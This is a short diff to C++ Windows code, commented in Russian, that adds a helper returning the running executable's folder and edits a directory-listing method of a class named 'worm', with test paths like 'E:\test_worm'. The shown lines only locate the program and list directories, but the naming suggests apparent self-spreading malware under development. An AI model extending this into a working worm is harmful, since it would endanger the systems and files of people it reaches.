@@ -30,7 +30,27 @@ std::wstring get_own_path() {
     }
 }
 
+std::wstring get_own_folder() {
+    DWORD size = MAX_PATH;
+    std::wstring path;
 
+    while (true) {
+        path.resize(size);
+        DWORD result = GetModuleFileNameW(NULL, &path[0], size);
+        if (result == 0) {
+            // Ошибка получения пути
+            return L"";
+        }
+        if (result < size) {
+            path.resize(result);
+            break;
+        }
+        size *= 2; // Увеличиваем буфер
+    }
+
+    // Получаем директорию из полного пути к EXE
+    return std::filesystem::path(path).parent_path().wstring();
+}
 
 
 
@@ -239,7 +259,7 @@ void worm::search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir
 void worm::search_list_dir() // для старта поиска по дирректориям
 {
     list_dir.clear();
-    //search_list_dir(path_to_start, list_dir);
+    
     search_list_dir(path_to_start, list_dir);
     //search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
     //list_dir.push_back(path_to_start);
